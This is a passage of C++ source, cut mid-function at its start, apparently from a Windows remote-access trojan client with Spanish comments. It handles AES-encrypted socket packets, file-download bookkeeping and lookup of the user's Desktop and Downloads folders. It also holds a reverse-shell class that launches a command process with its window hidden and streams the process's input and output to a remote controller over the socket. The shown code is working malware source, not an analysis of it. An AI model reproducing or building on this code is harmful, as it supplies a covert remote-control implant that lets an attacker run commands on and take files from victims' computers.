        if (ioctlsocket(pSocket, FIONBIO, &iBlock) != 0) {
            __DBG_("No se pudo hacer block");
        }
    }
        
    //Leer primero sizeof(int) para opbtener el total de bytes a leer
    char cBuffSize[sizeof(int)];
    int iPaquetesize = recv(pSocket, cBuffSize, sizeof(int), pFlags);
    if (iPaquetesize == sizeof(int)) {
        memcpy(&iPaquetesize, cBuffSize, sizeof(int));
        if (iPaquetesize > 0 && iPaquetesize < MAX_PAQUETE_SIZE) {
            cRecvBuffer.resize(iPaquetesize);
            //Asegurarse de leer todos los bytes
            iRecibido = this->recv_all(pSocket, cRecvBuffer.data(), iPaquetesize, pFlags);
            if (iRecibido < 0) {
                _DBG_("No se pudo leer nada recv_all.", iRecibido);
                bErrorFlag = true;
            }
        }
    }else if(iPaquetesize <= 0){
        iRecibido = iPaquetesize;
        bErrorFlag = true;
    }
    
    if (err_code != nullptr) {
        *err_code = GetLastError();
    }

    //Restaurar block_mode en el socket
    if (isBlock && !this->BLOCK_MODE) {
        iBlock = 1;
        if (ioctlsocket(pSocket, FIONBIO, &iBlock) != 0) {
            __DBG_("No se pudo restaurar el block_mode en el socket");
        }
    }

    if (bErrorFlag) { return iRecibido; }
    
    //Decrypt data
    ByteArray bOut = this->bDec(reinterpret_cast<const unsigned char*>(cRecvBuffer.data()), iRecibido);
    iRecibido = bOut.size();
    if (iRecibido == 0) {
        _DBG_("[cRecv] No se pudo desencriptar el buffer", GetLastError());
        return 0;
    }

    pBuffer.resize(iRecibido);
    if (pBuffer.size() == iRecibido) {
        memcpy(pBuffer.data(), bOut.data(), iRecibido);
    }else {
        _DBG_("[cRecv] No se pudo reservar memoria para el buffer de salida", GetLastError());
        return 0;
    }
    return iRecibido;
}

void Cliente::m_SerializarPaquete(const Paquete& paquete, char* cBuffer) {
    memcpy(cBuffer, &paquete.uiTipoPaquete, sizeof(paquete.uiTipoPaquete));
    memcpy(cBuffer + sizeof(paquete.uiTipoPaquete), &paquete.uiTamBuffer, sizeof(paquete.uiTamBuffer));
    memcpy(cBuffer + sizeof(paquete.uiTipoPaquete) + sizeof(paquete.uiTamBuffer), &paquete.uiIsUltimo, sizeof(paquete.uiIsUltimo));
    memcpy(cBuffer + sizeof(paquete.uiTipoPaquete) + sizeof(paquete.uiTamBuffer) + sizeof(paquete.uiIsUltimo), paquete.cBuffer.data(), paquete.uiTamBuffer);
}

bool Cliente::m_DeserializarPaquete(const char* cBuffer, Paquete& paquete, int bufer_size) {
    if (bufer_size < PAQUETE_MINIMUM_SIZE) { return false; }
    memcpy(&paquete.uiTipoPaquete, cBuffer,  sizeof(paquete.uiTipoPaquete));
    memcpy(&paquete.uiTamBuffer,   cBuffer + sizeof(paquete.uiTipoPaquete),  sizeof(paquete.uiTamBuffer));
    memcpy(&paquete.uiIsUltimo,    cBuffer + sizeof(paquete.uiTipoPaquete) + sizeof(paquete.uiTamBuffer),  sizeof(paquete.uiIsUltimo));
    
    if (paquete.uiTamBuffer > 0 && paquete.uiTamBuffer < MAX_PAQUETE_SIZE) {
        paquete.cBuffer.resize(paquete.uiTamBuffer);
    }else {
        return false;
    }

    if (paquete.cBuffer.size() == paquete.uiTamBuffer) {
        memcpy(paquete.cBuffer.data(), cBuffer + sizeof(paquete.uiTipoPaquete) + sizeof(paquete.uiTamBuffer) + sizeof(paquete.uiIsUltimo), paquete.uiTamBuffer);
    }else {
        _DBG_("[DESER] No se pudo reservar memoria", GetLastError());
        return false;
    }
    return true;
}

void Cliente::Agregar_Archivo_Descarga(Archivo_Descarga& nuevo_archivo, const std::string strID) {
    std::unique_lock<std::mutex> lock(this->mtx_map_archivos);
    this->map_Archivos_Descarga.insert(std::make_pair(strID, nuevo_archivo));
}

//AES256
ByteArray Cliente::bEnc(const unsigned char* pInput, size_t pLen) {
    ByteArray bOutput;
    ByteArray::size_type enc_len = Aes256::encrypt(this->bKey, pInput, pLen, bOutput);
    if (enc_len <= 0) {
        __DBG_("Error encriptando el buffer");
    }
    return bOutput;
}

ByteArray Cliente::bDec(const unsigned char* pInput, size_t pLen) {
    ByteArray bOutput;
    ByteArray::size_type dec_len = Aes256::decrypt(this->bKey, pInput, pLen, bOutput);
    if (dec_len <= 0) {
        __DBG_("Error desencriptando");
    }
    return bOutput;
}

//Misc
std::string Cliente::ObtenerDesk() {
    TCHAR szTemp[MAX_PATH];
    if (SHGetFolderPath(NULL, CSIDL_DESKTOPDIRECTORY, NULL, 0, szTemp) == S_OK) {
        return std::string(szTemp) + "\\";
    }
    return std::string("-");
}

std::string Cliente::ObtenerDown() {
    TCHAR szTemp[MAX_PATH];
    std::string strRutaDesc = "";
    WIN32_FIND_DATA win32Archivo_1;
    if (GetEnvironmentVariable("USERPROFILE", (LPSTR)szTemp, sizeof(szTemp)) > 0) {
        strRutaDesc = szTemp;
        strRutaDesc += "\\Descargas";
        if (FindFirstFileA(strRutaDesc.c_str(), &win32Archivo_1) != INVALID_HANDLE_VALUE) {
            return strRutaDesc + "\\";
        }
        else {
            strRutaDesc = szTemp;
            strRutaDesc += "\\Downloads";
            if (FindFirstFileA(strRutaDesc.c_str(), &win32Archivo_1) != INVALID_HANDLE_VALUE) {
                return strRutaDesc + "\\";
            }
            else {
                return std::string("-");
            };
        }
    }
    else {
        return std::string("-");
    }
}

//Reverse shell

bool ReverseShell::SpawnShell(const char* pstrComando) {
    __DBG_("Lanzando " + std::string(pstrComando));

    this->stdinRd = this->stdinWr = this->stdoutRd = this->stdoutWr = nullptr;
    SECURITY_ATTRIBUTES sa;
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.lpSecurityDescriptor = nullptr;
    sa.bInheritHandle = true;
    if (!CreatePipe(&this->stdinRd, &this->stdinWr, &sa, 0) || !CreatePipe(&this->stdoutRd, &this->stdoutWr, &sa, 0)) {
        __DBG_("Error creando tuberias");
        return false;
    }
    STARTUPINFO si;
    GetStartupInfo(&si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdOutput = this->stdoutWr;
    si.hStdError = this->stdoutWr;
    si.hStdInput = this->stdinRd;

    if (CreateProcess(nullptr, (LPSTR)pstrComando, nullptr, nullptr, true, CREATE_NEW_CONSOLE, nullptr, nullptr, &si, &this->pi) == 0) {
        __DBG_("No se pudo spawnear la shell");
        return false;
    }
    
    //La shell esta corriendo
    this->isRunning = true;
    __DBG_("Running!");
    
    this->tRead = std::thread(&ReverseShell::thLeerShell, this, stdoutRd);
    
    return true;
}

void ReverseShell::StopShell() {
    std::unique_lock<std::mutex> lock(this->mutex_shell);
    this->isRunning = false;
}

void ReverseShell::TerminarShell() {
    
    std::unique_lock<std::mutex> lock(this->mutex_shell);
    this->isRunning = false;
    lock.unlock();

    if (this->tRead.joinable()) {
        this->tRead.join();
    }

    cCliente->cChunkSend(this->sckSocket, DUMMY_PARAM, sizeof(DUMMY_PARAM), 0, true, nullptr, EnumComandos::Reverse_Shell_Finish);
    
    TerminateProcess(this->pi.hProcess, 0);
    if (this->stdinRd != nullptr) {
        CloseHandle(this->stdinRd);
        this->stdinRd = nullptr;
    }
    if (this->stdinWr != nullptr) {
        CloseHandle(this->stdinWr);
        this->stdinWr = nullptr;
    }
    if (this->stdoutRd != nullptr) {
        CloseHandle(this->stdoutRd);
        this->stdoutRd = nullptr;
    }
    if (this->stdoutWr != nullptr) {
        CloseHandle(this->stdoutWr);
        this->stdoutWr = nullptr;
    }
}

void ReverseShell::thLeerShell(HANDLE hPipe) {
    //int iLen = 0; , iRet = 0;
    char cBuffer[4096], cBuffer2[4096 * 2 + 30];
    DWORD dBytesReaded = 0, dBufferC = 0, dBytesToWrite = 0;
    BYTE bPChar = 0;
    while (this->isRunning) {
        if (PeekNamedPipe(hPipe, cBuffer, sizeof(cBuffer), &dBytesReaded, nullptr, nullptr)) {
            if (dBytesReaded > 0) {
                ReadFile(hPipe, cBuffer, sizeof(cBuffer), &dBytesReaded, nullptr);
            }else {
                std::this_thread::sleep_for(std::chrono::milliseconds(10));
                continue;
            }
            for (dBufferC = 0, dBytesToWrite = 0; dBufferC < dBytesReaded; dBufferC++) {
                if (cBuffer[dBufferC] == '\n' && bPChar != '\r') {
                    cBuffer2[dBytesToWrite++] = '\r';
                }
                bPChar = cBuffer2[dBytesToWrite++] = cBuffer[dBufferC];
            }
            cBuffer2[dBytesToWrite] = '\0';

            int iEnviado = cCliente->cChunkSend(this->sckSocket, cBuffer2, dBytesToWrite, 0, true, nullptr, EnumComandos::Reverse_Shell_Salida);
            std::this_thread::sleep_for(std::chrono::milliseconds(10));
            if (iEnviado <= 0) {
                //Desconectado o se perdio la conexion
                this->StopShell();
                break;
            }

        }else {
            //error peeknamedpipe
            this->StopShell();
            break;
        }
    }
    __DBG_("[!]thLeerShell finalizada");
}

void ReverseShell::thEscribirShell(std::string pStrInput) {
    if (pStrInput == "exit\r\n") {
        std::unique_lock<std::mutex> lock(this->mutex_shell);
        this->isRunning = false;
        lock.unlock();
    }

    DWORD dBytesWrited = 0;
    //stdinWr tuberia de entrada
    if (!WriteFile(this->stdinWr, pStrInput.c_str(), pStrInput.size(), &dBytesWrited, nullptr)) {
        __DBG_("Error escribiendo a la tuberia\n-DATA: " + pStrInput);
        std::unique_lock<std::mutex> lock(this->mutex_shell);
        this->isRunning = false;
        lock.unlock();
    }
}

